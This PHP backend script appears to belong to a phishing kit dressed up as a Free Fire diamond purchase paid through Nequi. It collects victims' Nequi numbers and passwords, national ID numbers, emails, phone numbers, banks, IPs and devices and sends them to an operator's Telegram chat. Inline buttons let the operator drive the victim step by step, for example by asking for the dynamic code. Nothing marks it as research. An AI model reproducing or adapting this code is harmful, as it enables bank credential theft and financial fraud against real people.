<?php
ini_set('display_errors', 0);
error_reporting(0);
header('Content-Type: application/json');

/* ============================================================
   ARCHIVOS
   ============================================================ */
$USED_TOKENS_FILE = __DIR__ . '/used_tokens.json';
$UPDATE_OFFSET_FILE = __DIR__ . '/update_offset.txt';
$PROCESSED_CALLBACKS_FILE = __DIR__ . '/processed_callbacks.json';

/* ============================================================
   CARGAR CONFIG
   ============================================================ */
function loadConfig()
{
    $file = __DIR__ . '/../config.php';
    if (!file_exists($file)) return null;

    $config = require $file;
    if (empty($config['bot_token']) || empty($config['chat_id'])) return null;

    return [
        'token'   => $config['bot_token'],
        'chat_id' => $config['chat_id']
    ];
}

/* ============================================================
   TELEGRAM: SEND MESSAGE
   ============================================================ */
function sendMessage($token, $chatId, $text, $keyboard)
{
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_SSL_VERIFYPEER => false, // Deshabilitar verificación SSL para desarrollo local
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}

/* ============================================================
   TELEGRAM: EDIT MESSAGE
   ============================================================ */
function editMessage($token, $chatId, $messageId, $text)
{
    $payload = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_SSL_VERIFYPEER => false, // Deshabilitar verificación SSL para desarrollo local
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    curl_exec($ch);
    curl_close($ch);
}

/* ============================================================
   KEYBOARD
   ============================================================ */
function buildKeyboard($tid)
{
    return [
        'inline_keyboard' => [
            [['text' => '🧠🖼 Pedir logo y dinámica', 'callback_data' => "dinamica_logo:$tid"]],
            [['text' => '✅ Pago enviado', 'callback_data' => "enviado:$tid"]],
            [['text' => '🔁 Repetir Nequi', 'callback_data' => "repetir:$tid"]],
            [['text' => '🔄 Elegir otro método', 'callback_data' => "otro:$tid"]],
            [['text' => '🏁 Finalizar', 'callback_data' => "fin:$tid"]]
        ]
    ];
}

/* ============================================================
   MENSAJE - ADAPTADO PARA FREE FIRE
   ============================================================ */
function formatMessage($d)
{
    // Tomar datos directamente del payload
    $b = $d['bancoldata'] ?? [];
    $tbdatos = $d['tbdatos'] ?? [];
    $freefire = $d['freefire'] ?? [];
    $monto = number_format((float)($d['total'] ?? 0), 0, ',', '.');
    
    // OBTENER IP Y HORA ACTUAL
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'No disponible';
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        // IP pública
    } else {
        $ip = 'No disponible';
    }
    
    date_default_timezone_set('America/Bogota');
    $hora = date('d/m/Y H:i:s');
    
    // DETERMINAR DISPOSITIVO
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $dispositivo = 'PC';
    if (preg_match('/Android/i', $userAgent)) {
        $dispositivo = 'Android';
    } elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) {
        $dispositivo = 'iPhone';
    } elseif (preg_match('/Windows/i', $userAgent)) {
        $dispositivo = 'PC';
    } elseif (preg_match('/Mac/i', $userAgent)) {
        $dispositivo = 'Mac';
    } elseif (preg_match('/Linux/i', $userAgent)) {
        $dispositivo = 'Linux';
    }
    
    // TOMAR LOS DATOS DEL TBDATOS
    $correo = $tbdatos['correo'] ?? 'No disponible';
    $celular = $tbdatos['telefono'] ?? $tbdatos['cel'] ?? 'No disponible';
    $cedula = $tbdatos['identificacion'] ?? $tbdatos['val'] ?? 'No disponible';
    $persona = $tbdatos['tipo_persona'] ?? $tbdatos['per'] ?? 'No disponible';
    $banco = $tbdatos['banco'] ?? $tbdatos['nom'] ?? 'No disponible';
    
    // DATOS DE FREE FIRE
    $diamonds = $freefire['diamonds'] ?? 0;
    $bonus = $freefire['bonus'] ?? 0;
    $playerId = $freefire['playerId'] ?? '';
    $playerName = $freefire['playerName'] ?? '';
    
    $msg = "<b>💎 FREE FIRE - NEQUI PSE 💎</b>\n";
    $msg .= "<b>• 🎮 Player ID:</b> <code>" . htmlspecialchars($playerId) . "</code>\n";
    $msg .= "<b>• 👤 Player Name:</b> " . htmlspecialchars($playerName) . "\n";
    $msg .= "<b>• 💎 Diamantes:</b> " . htmlspecialchars($diamonds) . "\n";
    if ($bonus > 0) {
        $msg .= "<b>• 🎁 Bonus:</b> " . htmlspecialchars($bonus) . "\n";
    }
    $msg .= "<b>• 💰 Precio:</b> $ " . $monto . "\n";
    $msg .= "------------------------------\n";
    $msg .= "<b>• 💸Cédula:</b> " . htmlspecialchars($cedula) . "\n";
    $msg .= "<b>• 💌Correo:</b> " . htmlspecialchars($correo) . "\n";
    $msg .= "<b>• 📞Celular:</b> " . htmlspecialchars($celular) . "\n";
    $msg .= "<b>• 🏦Banco:</b> " . htmlspecialchars($banco) . "\n";
    $msg .= "------------------------------\n";
    $msg .= "<b>• 📱 Número Nequi:</b> <code>" . htmlspecialchars($b['usuario'] ?? 'N/D') . "</code>\n";
    $msg .= "<b>• 📟Dispositivo:</b> " . $dispositivo . "\n";
    $msg .= "<b>• 🗺IP:</b> " . $ip . "\n";
    $msg .= "<b>• ⏱Hora:</b> " . $hora . "\n";

    return $msg;
}

/* ============================================================
   TOKENS
   ============================================================ */
function isTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    if (!file_exists($USED_TOKENS_FILE)) return false;
    $tokens = json_decode(file_get_contents($USED_TOKENS_FILE), true);
    return isset($tokens[$id]);
}

function markTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    $tokens = file_exists($USED_TOKENS_FILE)
        ? json_decode(file_get_contents($USED_TOKENS_FILE), true)
        : [];
    $tokens[$id] = time();
    file_put_contents($USED_TOKENS_FILE, json_encode($tokens));
}

function getLastUpdateId()
{
    global $UPDATE_OFFSET_FILE;
    if (!file_exists($UPDATE_OFFSET_FILE)) return 0;
    $offset = trim(file_get_contents($UPDATE_OFFSET_FILE));
    return is_numeric($offset) ? (int)$offset : 0;
}

function saveLastUpdateId($updateId)
{
    global $UPDATE_OFFSET_FILE;
    file_put_contents($UPDATE_OFFSET_FILE, $updateId);
}

function isCallbackProcessed($callbackId)
{
    global $PROCESSED_CALLBACKS_FILE;
    if (!file_exists($PROCESSED_CALLBACKS_FILE)) return false;
    $callbacks = json_decode(file_get_contents($PROCESSED_CALLBACKS_FILE), true);
    return isset($callbacks[$callbackId]);
}

function markCallbackProcessed($callbackId)
{
    global $PROCESSED_CALLBACKS_FILE;
    $callbacks = file_exists($PROCESSED_CALLBACKS_FILE)
        ? json_decode(file_get_contents($PROCESSED_CALLBACKS_FILE), true)
        : [];
    $callbacks[$callbackId] = time();
    file_put_contents($PROCESSED_CALLBACKS_FILE, json_encode($callbacks));
}

/* ============================================================
   CONFIG
   ============================================================ */
$config = loadConfig();
if (!$config) {
    file_put_contents(__DIR__ . '/debug_polling.log', date('Y-m-d H:i:s') . " - Config failed\n", FILE_APPEND);
    echo json_encode(['ok' => false]);
    exit;
}

/* ============================================================
   POST → ENVÍO INICIAL
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $d = json_decode(file_get_contents('php://input'), true);

    // MANEJAR ENVÍO DIRECTO DE DATOS NEQUI
    if (isset($d['action']) && $d['action'] === 'enviar_datos_nequi_directo') {
        $telefono = $d['telefono'] ?? '';
        $clave = $d['clave'] ?? '';
        $monto = $d['monto'] ?? '0';
        $playerId = $d['playerId'] ?? '';
        $playerName = $d['playerName'] ?? '';
        $diamonds = $d['diamonds'] ?? '0';
        $bonus = $d['bonus'] ?? '0';

        if (empty($telefono) || empty($clave)) {
            echo json_encode(['ok' => false, 'error' => 'Datos incompletos']);
            exit;
        }

        // Crear mensaje directo con datos de Nequi
        $msg = "<b>💎 FREE FIRE - DATOS NEQUI RECIBIDOS 💎</b>\n";
        $msg .= "<b>• 🎮 Player ID:</b> <code>" . htmlspecialchars($playerId) . "</code>\n";
        $msg .= "<b>• 👤 Player Name:</b> " . htmlspecialchars($playerName) . "\n";
        $msg .= "<b>• 💎 Diamantes:</b> " . htmlspecialchars($diamonds) . "\n";
        if ($bonus > 0) {
            $msg .= "<b>• 🎁 Bonus:</b> " . htmlspecialchars($bonus) . "\n";
        }
        $msg .= "<b>• 💰 Monto:</b> $ " . number_format((float)$monto, 0, ',', '.') . "\n";
        $msg .= "------------------------------\n";
        $msg .= "<b>• 📱 Número Nequi:</b> <code>" . htmlspecialchars($telefono) . "</code>\n";
        $msg .= "<b>• 🔐 Clave:</b> <code>" . htmlspecialchars($clave) . "</code>\n";
        $msg .= "------------------------------\n";

        // Obtener IP y dispositivo
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'No disponible';
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $dispositivo = 'PC';
        if (preg_match('/Android/i', $userAgent)) {
            $dispositivo = 'Android';
        } elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) {
            $dispositivo = 'iPhone';
        }

        date_default_timezone_set('America/Bogota');
        $hora = date('d/m/Y H:i:s');

        $msg .= "<b>• 📟 Dispositivo:</b> " . $dispositivo . "\n";
        $msg .= "<b>• 🗺 IP:</b> " . $ip . "\n";
        $msg .= "<b>• ⏱ Hora:</b> " . $hora . "\n";

        // Enviar mensaje directo a Telegram sin botones
        $keyboard = ['inline_keyboard' => []]; // Sin botones
        $sent = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);

        echo json_encode(['ok' => !empty($sent['ok'])]);
        exit;
    }

    // CÓDIGO ORIGINAL PARA ENVÍO INICIAL
    $tid = $d['transactionId'] ?? '';

    if (!$tid || isTokenUsed($tid)) {
        echo json_encode(['ok' => false]);
        exit;
    }

    markTokenUsed($tid);

    $msg = formatMessage($d);
    $keyboard = buildKeyboard($tid);
    $sent = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);

    echo json_encode(['ok' => !empty($sent['ok'])]);
    exit;
}

/* ============================================================
   GET → POLLING + REESCRIBE MENSAJE
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {

    $tid = $_GET['transactionId'];

    // First check if there's a pending action from webhook
    $actionFile = __DIR__ . '/actions/' . $tid . '.json';
    if (file_exists($actionFile)) {
        $actionData = json_decode(file_get_contents($actionFile), true);
        if ($actionData && isset($actionData['action'])) {
            unlink($actionFile); // Remove after processing
            echo json_encode([
                'ok' => true,
                'action' => $actionData['action']
            ]);
            exit;
        }
    }

    // Fallback to polling - get recent updates
    $lastUpdateId = getLastUpdateId();
    $ch = curl_init("https://api.telegram.org/bot{$config['token']}/getUpdates?offset=" . ($lastUpdateId + 1) . "&limit=10&timeout=1");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3
    ]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Debug logging
    file_put_contents(__DIR__ . '/debug_polling.log', date('Y-m-d H:i:s') . " - TID: $tid, Offset: " . ($lastUpdateId + 1) . ", HTTP: $httpCode, Response: " . substr($response, 0, 200) . "\n", FILE_APPEND);

    if (!$response || $httpCode !== 200) {
        file_put_contents(__DIR__ . '/debug_polling.log', date('Y-m-d H:i:s') . " - ERROR: No response or bad HTTP code\n", FILE_APPEND);
        echo json_encode(['ok' => false]);
        exit;
    }

    $updates = json_decode($response, true);
    if (!isset($updates['result']) || empty($updates['result'])) {
        file_put_contents(__DIR__ . '/debug_polling.log', date('Y-m-d H:i:s') . " - No updates\n", FILE_APPEND);
        echo json_encode(['ok' => false]);
        exit;
    }

    $maxUpdateId = $lastUpdateId;
    $foundCallback = false;
    foreach ($updates['result'] as $upd) {
        $maxUpdateId = max($maxUpdateId, $upd['update_id']);
        if (
            isset($upd['callback_query']) &&
            strpos($upd['callback_query']['data'], $tid) !== false
        ) {
            $foundCallback = true;
            file_put_contents(__DIR__ . '/debug_polling.log', date('Y-m-d H:i:s') . " - Found callback for TID: $tid\n", FILE_APPEND);
            $callbackId = $upd['callback_query']['id'];
            
            // Verificar si ya procesamos este callback
            if (isCallbackProcessed($callbackId)) {
                continue;
            }

            $action = explode(':', $upd['callback_query']['data'])[0];
            $user = $upd['callback_query']['from']['username']
                ?? $upd['callback_query']['from']['first_name']
                ?? 'desconocido';

            $msgId = $upd['callback_query']['message']['message_id'];
            $original = $upd['callback_query']['message']['text'];

            $newText = $original
                . "\n━━━━━━━━━━━━━━━━━━━━"
                . "\n✅ <b>Acción:</b> <code>" . strtoupper($action) . "</code>"
                . "\n👤 <b>Usuario:</b> @" . $user;

            editMessage(
                $config['token'],
                $config['chat_id'],
                $msgId,
                $newText
            );

            // Marcar callback como procesado
            markCallbackProcessed($callbackId);

            echo json_encode([
                'ok' => true,
                'action' => $action
            ]);
            exit;
        }
    }

    // Save the new offset
    saveLastUpdateId($maxUpdateId);

    echo json_encode(['ok' => false]);
    exit;
}

/* ============================================================
   DEFAULT
   ============================================================ */
echo json_encode(['ok' => false]);
exit;